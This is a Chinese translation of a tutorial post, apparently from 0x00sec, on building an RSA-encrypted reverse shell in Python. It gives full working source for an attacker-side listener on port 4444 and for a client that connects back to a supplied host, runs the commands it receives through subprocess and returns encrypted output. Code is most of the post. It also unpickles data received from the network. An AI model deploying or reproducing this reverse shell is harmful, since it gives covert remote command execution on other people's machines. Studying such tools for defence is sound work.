# [i春秋翻译小组-Neo(李皓伟）](https://bbs.ichunqiu.com/thread-48300-1-1.html)  

# 使用RSA加密在Python中逆向shell

这是一个关于使用RSA加密编程逆向shell的python教程。 我想提一下，这篇文章更多的是关于理解shell中涉及的加密而不是shell本身。
github的链接是<https://github.com/ca10x/RSA-reverse-shell>

侦听器

首先，我们需要一个侦听器来处理所有传入的连接。 这是listener_rsa.py的代码

    
    
    #!/usr/bin/python
    
    from Crypto.PublicKey import RSA
    from Crypto import Random
    from Crypto.Hash import SHA256
    import socket
    from thread import *
    import sys
    import pickle
    
    #Generate public key and private key
    
    random_generator = Random.new().read
    key = RSA.generate(2048, random_generator)
    public_key = key.publickey()
    
    #Create socket and bind to accept connections
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("0.0.0.0", 4444))
    except socket.error, v:
        print "Binding failed. Error code : " + str(v[0]) + " Message " + v[1]
        sys.exit()

​

    
    
    print "Socket bind complete"
    
    s.listen(2)
    print "[+] Listening to the incoming connection on port 4444..."
    
    def clientthread_sendpublickey(client) :
        client.send(pickle.dumps(public_key))
    
    def clienthandle(client) :
        while True :
            command = raw_input('~$ ')
            client.send(command)
            if command == 'quit' :
               break
            buf = client.recv(2048)
            encreply = pickle.loads(buf)
            print key.decrypt(encreply)
    
    while True:
        (client, (ip, port)) = s.accept()
        print "Received connection from : ", ip
        start_new_thread(clientthread_sendpublickey, (client,))
        print "Public Key sent to", ip
    start_new_thread(clienthandle, (client,))

我在Python中使用PyCrypto模块进行加密。 继续安装它。 我建议使用pip来安装模块。

    
    
    $ sudo pip install pycrypto

在我们进入代码之前，让我向你解释一下RSA加密及其密钥。 RSA是一种非对称加密标准。 它有两个键，公共和私有。 简单来说，公钥用于加密消息，私钥用于解密。
下面是描述该过程的框图

![image.png](https://image.3001.net/images/20181128/1543395714_5bfe59820b8aa.png!small)

如果你对RSA的数学工作感兴趣，那么我建议你阅读<http://mathworld.wolfram.com/RSAEncryption.html>（当心，仅限极客）

在上面的程序中，首先生成密钥，该密钥也是私钥。

    
    
    key = RSA.generate(2048, random_generator)

函数RSA.generate有两个参数，第一个是以位为单位的密钥的大小，第二个是通常使用python随机函数生成的随机数。
在创建私钥之后，从中提取公钥并将其存储在变量中以供将来使用。

    
    
    public_key = key.publickey()

使用套接字模块创建套接字，这相对简单。 你可以参考Python套接字1的官方文档，甚至可以进行简单的Google搜索。

套接字绑定并等待连接传入连接。

注 - 如果要将Linux中的套接字绑定到小于1024的端口，则必须以root身份执行该脚本。

当收到连接时，初始化新线程以将生成的公钥发送到客户端，以便它可以加密回复。

    
    
    def clientthread_sendpublickey(client) :
    client.send(pickle.dumps(public_key))

我们为什么要用Pickle？ Pickle用于序列化和反序列化python对象。
由于public_key不是常规字符串，因此必须对其进行pickle，然后将其发送到接收方。

警告 - pickle模块不能防止错误或恶意构造的数据。 切勿取消从不受信任或未经身份验证的来源收到的数据。

一旦发送了公钥，另一个线程clienthandle（客户端）被初始化为True：loop，它发送给接收者的命令。 接收器运行命令并使用公钥加密输出。
然后将输出的pickle发送给监听器。

回复是unpickled，使用私钥解密并打印在屏幕上。

    
    
    encreply = pickle.loads(buf)
    print key.decrypt(encreply)

如果给出'quit'命令，则终止连接。

## 反向shell

让我们转到反向shell所在的接收器端。 reverse_shell_rsa的脚本如下所示

    
    
    #!/usr/bin/python
    
    import socket, subprocess, sys
    from Crypto.PublicKey import RSA
    from Crypto.Hash import SHA256
    import pickle

​

    
    
    RHOST = sys.argv[1]
    RPORT = 4444
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    
    def receive_key():
       data_key = s.recv(1024)
       return data_key
    
    pickled_publickey = receive_key()
    public_key = pickle.loads(pickled_publickey)

​

    
    
    while True :
        command = s.recv(1024)
        if command == 'quit' :
             break
        reply = subprocess.Popen(str(command), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = reply.communicate()
        en_reply = public_key.encrypt(stdout, 32)
        s.send(pickle.dumps(en_reply))
    
    s.close()

一如既往，导入必要的模块。 要连接的IP地址作为参数提供，并存储在RHOST变量中。 创建套接字并与服务器（侦听器）建立连接。
一旦接受连接，服务器就会发送公钥（在listener.py脚本中向上滚动到clientthread_sendpublickey（）），该公钥通过函数receive_key（）接收并去除（记住pickling？）以获取公钥。

    
    
    def receive_key():
    data_key = s.recv(1024)
    return data_key
    
    pickled_publickey = receive_key()
    public_key = pickle.loads(pickled_publickey)

一段时间初始化True循环以保持连接的持久性并接收命令。 如果命令是“退出”，则节目结束。
否则，给定的命令作为子进程和标准输出运行，标准错误通过管道传递给变量'reply'。 然后使用公钥对标准输出进行加密，pickling并发送到服务器。

    
    
    en_reply = public_key.encrypt(stdout, 32)
    s.send(pickle.dumps(en_reply))

然后耐心等待，直到下一个命令。

## 重要的提示

这种方法是'教科书RSA'的实现。 对于真实世界的实现，你必须添加填充，例如PKCS1_OAEP。

RSA速度慢很多，一次只能加密256个字节。 你为什么问？ 因为n的值是2048和2048/8 =
256.如果添加填充，阈值将降低，因为它占用了更多的字节。

解决方法是RSA应该通过AES使用。

我将在下一篇文章中解释这个概念。 由于这是我的第一篇文章，欢迎并感谢你的反馈。

新年快乐的人们！

问候，

作者： Cal0X

翻译：i春秋翻译小组-Neo(李皓伟）

责任编辑：F0rmat

翻译来源：<https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414>

  
  

